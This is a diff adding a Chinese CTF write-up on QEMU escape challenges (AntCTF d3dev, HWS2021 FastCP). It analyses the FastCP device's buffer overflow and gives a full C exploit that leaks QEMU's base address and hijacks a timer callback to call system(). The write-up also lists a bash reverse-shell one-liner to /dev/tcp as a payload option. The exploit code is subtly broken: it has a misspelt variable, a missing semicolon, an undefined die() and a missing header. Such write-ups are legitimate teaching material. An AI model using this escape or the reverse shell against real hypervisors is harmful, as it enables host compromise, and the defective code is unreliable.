@@ -29,7 +29,7 @@ pci外设地址，形如`0000:00:1f.1`。第一个部分16位表示域；第二�
 每个设备的目录下`resource0` 对应`MMIO`空间。`resource1` 对应`PMIO`空间。
 `resource`文件里面会记录相关的数据，第一行就是`mimo`的信息，从左到右是：起始地址、结束地址、标识位。
 
-## 0x01. AntCTF 2021 d3dev
+## 0x01  AntCTF 2021 d3dev
 
 ### 1. 分析
 
@@ -288,5 +288,434 @@ chmod +x expliot &&\
 cp ./expliot ./cpio-root/expliot &&\
 cd ./cpio-root &&\
 find . | cpio -o --format=newc > ../rootfs.img
+````
+
+## 0x02 HWS2021 FastCP
+
+### 1. 分析
+
+````bas
+#!/bin/sh
+
+./qemu-system-x86_64 -initrd ./rootfs.img -nographic -kernel ./vmlinuz-5.0.5-generic -append "priority=low console=ttyS0" -monitor /dev/null --device FastCP
+
+````
+
+可以看到有设备FastCP
+
+````c
+void __fastcall pci_FastCP_realize(PCIDevice_0 *pdev, Error_0 **errp)
+{
+  Object_0 *v2; // rbp
+
+  v2 = object_dynamic_cast_assert(
+         &pdev->qdev.parent_obj,
+         "FastCP",
+         "/root/source/qemu/hw/misc/fastcp.c",
+         258,
+         "pci_FastCP_realize");
+  pdev->config[61] = 1;
+  if ( !msi_init(pdev, 0, 1u, 1, 0, errp) )
+  {
+    timer_init_full(
+      (QEMUTimer_0 *)&v2[166].properties,
+      0LL,
+      QEMU_CLOCK_VIRTUAL,
+      (int)&stru_F4240,
+      0,
+      fastcp_cp_timer,
+      v2);
+    memory_region_init_io(
+      (MemoryRegion_0 *)&v2[57].free,
+      v2,
+      &fastcp_mmio_ops,
+      v2,
+      "fastcp-mmio",
+      (uint64_t)&stru_100000);
+    pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&v2[57].free);
+    HIDWORD(v2[63].parent) = 0;
+  }
+}
+````
+
+主要有mmio操作和cp_timer操作
+
+接下来分析mmio_read操作
+
+![](https://pic1.imgdb.cn/item/6358f67116f2c2beb1334b2c.png)
+
+可以看到如果size==8 ，根据addr的不同返回不同的数据，
+
+其中为了控制size==0需要设置addr为`uint64_t`类型
+
+接下来分析mmio_write
+
+![](https://pic1.imgdb.cn/item/6358f82716f2c2beb136cffd.png)
+
+当addr==24的时候不仅设置cmd，还触发时钟函数``timer_mod``
+
+之后分析``fastcp_cp_timer``函数
+
+![](https://pic1.imgdb.cn/item/6358fa8116f2c2beb13b7715.png)
+
+timer函数根据传入的参数cmd来选择执行的分支
+
+![](https://pic1.imgdb.cn/item/6358fbce16f2c2beb13db48c.png)
+
+漏洞很明显位于在命令为 1 且 CP_list_cnt 大于 0x10 的时候，复制前没有检测 CP_cnt 是否会大于 0x1000 字节，而在 FastCPState 的结构中（结构如下）
+
+````
+00000000 FastCPState struc ; (sizeof=0x1A30, align=0x10, copyof_4530)
+00000000 pdev PCIDevice_0 ?
+000008F0 mmio MemoryRegion_0 ?
+000009E0 cp_state CP_state ?
+000009F8 handling db ?
+000009F9 db ? ; undefined
+000009FA db ? ; undefined
+000009FB db ? ; undefined
+000009FC irq_status dd ?
+00000A00 CP_buffer db 4096 dup(?)
+00001A00 cp_timer QEMUTimer_0 ?
+00001A30 FastCPState ends
+````
+
+可以看出CP_buffer只有0x1000字节。
+
+通过`pagemap`将虚拟机中的虚拟地址转换为物理地址。
+
+根据内核文档可知，每个虚拟页在`/proc/pid/pagemap`中对应一项长度为`64 bits`的数据，其中`Bit 63`为`page present`，表示物理内存页是否已存在；若物理页已存在，则`Bits 0-54`表示物理页号，此外，需要`root`权限的进程才能读取`/proc/pid/pagemap`中的内容。
+
+```
+pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow
+userspace programs to examine the page tables and related information by
+reading files in /proc.
+
+There are four components to pagemap:
+
+*/proc/pid/pagemap. This file lets a userspace process find out which
+physical frame each virtual page is mapped to. It contains one 64-bit
+value for each virtual page, containing the following data (from
+fs/proc/task_mmu.c, above pagemap_read):
+
+* Bits 0-54 page frame number (PFN) if present
+* Bits 0-4 swap type if swapped
+* Bits 5-54 swap offset if swapped
+* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)
+* Bit 56 page exclusively mapped (since 4.2)
+* Bits 57-60 zero
+* Bit 61 page is file-page or shared-anon (since 3.5)
+* Bit 62 page swapped
+* Bit 63 page present
+
+Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.
+In 4.0 and 4.1 opens by unprivileged fail with -EPERM. Starting from
+4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.
+Reason: information about PFNs helps in exploiting Rowhammer vulnerability.
+```
+
+根据以上信息，利用`/proc/pid/pagemap`可将虚拟地址转换为物理地址，具体步骤如下：
+
+1、 计算虚拟地址所在虚拟页对应的数据项在`/proc/pid/pagemap`中的偏移，`offset=(viraddr/pagesize)*sizeof(uint64_t)`
+
+2、 读取长度为`64bits`的数据项
+
+3、 根据`Bit 63` 判断物理内存页是否存在
+
+4、 若物理内存页已存在，则取`bits 0-54`作为物理页号
+
+5、 计算出物理页起始地址加上页内偏移即得到物理地址，`phtaddr = pageframenum * pagesize + viraddr % pagesize`
+
+对应代码如下：
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <assert.h>
+#include <fcntl.h>
+#include <inttypes.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/io.h>   
+#include <stdint.h>
+
+size_t va2pa(void *addr){
+    uint64_t data;
+
+    int fd = open("/proc/self/pagemap",O_RDONLY);
+    if(!fd){
+        perror("open pagemap");
+        return 0;
+    }
+
+    size_t pagesize = getpagesize();
+    size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);
+
+    if(lseek(fd,offset,SEEK_SET) < 0){
+        puts("lseek");
+        close(fd);
+        return 0;
+    }
+
+    if(read(fd,&data,8) != 8){
+        puts("read");
+        close(fd);
+        return 0;
+    }
+
+    if(!(data & (((uint64_t)1 << 63)))){
+        puts("page");
+        close(fd);
+        return 0;
+    }
+
+    size_t pageframenum = data & ((1ull << 55) - 1);
+    size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;
+
+    close(fd);
+
+    return phyaddr;
+}
+
+int main(){
+    char *userbuf;
+    uint64_t userbuf_pa;
+    unsigned char* mmio_mem;
+
+    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
+    if (mmio_fd == -1){
+        perror("open mmio");
+        exit(-1);
+    }
+
+    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
+    if (mmio_mem == MAP_FAILED){
+        perror("mmap mmio");
+        exit(-1);
+    }
+
+    printf("mmio_mem:\t%p\n", mmio_mem);
+
+    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    if (userbuf == MAP_FAILED){
+        perror("mmap userbuf");
+        exit(-1);
+    }
+
+    strcpy(usebuf,"test");
+
+    mlock(userbuf, 0x1000);
+    userbuf_pa = va2pa(userbuf);
+
+    printf("userbuf_va:\t%p\n",userbuf);
+    printf("userbuf_pa:\t%p\n",(void *)userbuf_pa);
+}
+```
+
+### 2. 漏洞利用
+
+- 通过溢出的读取，泄露 cp_timer 结构体，其中存在 PIE 基址（计算出 system@plt 的地址）和堆地址（整个结构的位置在堆上，计算出结构的开始位置，才能得到我们写入 system 参数的位置）。
+- 通过溢出的写入，覆盖 cp_timer 结构体控制程序执行流
+
+触发时钟可以利用两种方式：
+
+- 虚拟机重启或关机的时候会触发时钟，调用 cb(opaque)
+- 在 MMOI WRITE 中可以触发时钟
+
+system 执行内容：
+
+- cat /flag
+- 反弹 shell，/bin/bash -c ‘bash -i >& /dev/tcp/ip/port 0>&1’，在 QEMU 逃逸中，执行 system(“/bin/bash”) 是无法拿到 shell 的，或者说是无法与 shell 内容交互的，必须使用反弹 shell 的形式才能够拿到 shell。
+- 弹出计算器，gnome-calculator，这个大概比较适合用于做演示视频吧。
+
+注意：所有在设备中的操作地址都是指 QEMU 模拟的物理地址，但是程序中使用 mmap 申请的是虚拟地址空间。所以要注意使用 mmap 申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址。这个性质在这道题中（超过 0x1000 的物理地址复制），需要额外的注意。
+
+### 3. Exploit
+
+````c
+#include<stdint.h>
+#include<fcntl.h>
+#include<sys/mman.h>
+#include<sys/io.h>
+#include<stdio.h>
+#include<unistd.h>
+
+#define PAGE_SHIFT 12
+#define PAGE_SIZE (1 << PAGE_SHIFT)
+#define PFN_PRESENT (1ull << 63)
+#define PFN_PFN ((1ull << 55) - 1)
+
+unsigned char* mmio_mem;
+char* userbuf;
+uint64_t phy_userbuf,phy_userbuf2;
+
+struct FastCP_CP_INFO
+{
+    uint64_t CP_src;
+    uint64_t CP_cnt;
+    uint64_t CP_dst;
+};
+
+
+struct QEMUTimer
+{
+    int64_t expire_time;
+    int64_t timer_list;
+    int64_t cb;
+    void * opaque;
+    int64_t next;
+    int attributes;
+    int scale;
+    char shell[0x50];
+};
+
+
+void Err(char * err){
+    printf("Error: %s\n",err);
+    exit(-1);
+}
+
+uint64_t page_offset(uint64_t addr){
+    return addr & ((1 << PAGE_SHIFT) - 1)
+}
+
+uint64_t gva_to_gfn(void* addr)
+{
+    uint64_t pme, gfn;
+    size_t offset;
+
+    int fd = open("/proc/self/pagemap", O_RDONLY);
+    if (fd < 0)
+    {
+        die("open pagemap");
+    }
+    offset = ((uintptr_t)addr >> 9) & ~7;
+    lseek(fd, offset, SEEK_SET);
+    read(fd, &pme, 8);
+    if (!(pme & PFN_PRESENT))
+        return -1;
+    gfn = pme & PFN_PFN;
+    return gfn;
+}
+
+uint64_t gva_to_gpa(void* addr)
+{
+    uint64_t gfn = gva_to_gfn(addr);
+    assert(gfn != -1);
+    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
+}
+
+void init_mmio(){
+    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR|O_SYNC);
+    mmio_mem = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,0);
+}
+
+void mmio_write(uint32_t addr,uint32_t value){
+    *(uint32_t*)(mmio_mem+addr) = value;
+}
+
+uint64_t mmio_read(uint64_t addr){
+    return *(uint64_t*)(mmio_mem+addr); 
+}
+
+void fastcp_set_list_src(uint64_t list_addr)
+{
+    mmio_write(0x8, list_addr);
+}
+
+void fastcp_set_cnt(uint64_t cnt)
+{
+    mmio_write(0x10, cnt);
+}
+
+void fastcp_do_cmd(uint64_t cmd)
+{
+    mmio_write(0x18, cmd);
+}
+
+void fastcp_do_readfrombuffer(uint64_t addr,uint64_t len){
+    struct FastCP_CP_INFO info;
+    info.CP_cnt = len;
+    info.CP_src = NULL;
+    info.CP_dst = addr;
+    memcpy(userbuf,&info,sizeof(info));
+    fastcp_set_cnt(1);
+    fastcp_set_list_src(phy_userbuf);
+    fastcp_do_cmd(4);
+    sleep(1);
+}
+
+void fastcp_do_writetobuffer(uint64_t addr, uint64_t len)
+{
+    struct FastCP_CP_INFO info;
+    info.CP_cnt = len;
+    info.CP_src = addr;
+    info.CP_dst = NULL;
+    memcpy(userbuf, &info, sizeof(info));
+    fastcp_set_cnt(1);
+    fastcp_set_list_src(phy_userbuf);
+    fastcp_do_cmd(2);
+    sleep(1);
+}
+
+void fastcp_do_movebuffer(uint64_t srcaddr, uint64_t dstaddr, uint64_t len)
+{
+    struct FastCP_CP_INFO info[0x11];
+    for (int i = 0; i < 0x11; i++)
+    {
+        info[i].CP_cnt = len;
+        info[i].CP_src = srcaddr;
+        info[i].CP_dst = dstaddr;
+    }
+    memcpy(userbuf, &info, sizeof(info));
+    fastcp_set_cnt(0x11);
+    fastcp_set_list_src(phy_userbuf);
+    fastcp_do_cmd(1);
+    sleep(1);
+}
+
+
+int main(){
+    printf("[*] init pci and mmio:\n");
+    init_mmio();
+    printf("[*] mmio_mem: %p\n",mmio_mem);
+
+    userbuf = mmap(0,0x2000,PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+    mlock(userbuf,0x10000); // 锁定物理内存
+
+    phy_userbuf = gva_to_gpa(userbuf);
+    
+    printf("[*] user buff virtual address: %p\n", userbuf);
+    printf("[*] user buff physical address: %p\n", (void*)phy_userbuf);
+
+    fastcp_do_readfrombuffer(phy_userbuf, 0x1030);
+    fastcp_do_writetobuffer(phy_userbuf + 0x1000, 0x30);
+    fastcp_do_readfrombuffer(phy_userbuf, 0x30);
+
+    uint64_t leak_timer = *(uint64_t*)(&userbuf[0x10]);
+    printf("leaking timer: %p\n", (void*)leak_timer);
+    fastcp_set_cnt(1);
+    uint64_t pie_base = leak_timer - 0x4dce80;
+    printf("pie_base: %p\n", (void*)pie_base);
+    uint64_t system_plt = pie_base + 0x2C2180;
+    printf("system_plt: %p\n", (void*)system_plt);
+
+    uint64_t struct_head = *(uint64_t*)(&userbuf[0x18]);
+
+    struct QEMUTimer timer;
+    memset(&timer, 0, sizeof(timer));
+    timer.expire_time = 0xffffffffffffffff;
+    timer.timer_list = *(uint64_t*)(&userbuf[0x8]);
+    timer.cb = system_plt;
+    timer.opaque = struct_head + 0xa00 + 0x1000 + 0x30;
+    strcpy(&timer.shell, "gnome-calculator");
+    memcpy(userbuf + 0x1000, &timer, sizeof(timer));
+    fastcp_do_movebuffer(gva_to_gpa(userbuf + 0x1000) - 0x1000, gva_to_gpa(userbuf + 0x1000) - 0x1000, 0x1000 + sizeof(timer));
+    fastcp_do_cmd(1);
+
+    return 0;
+}
 ````
 
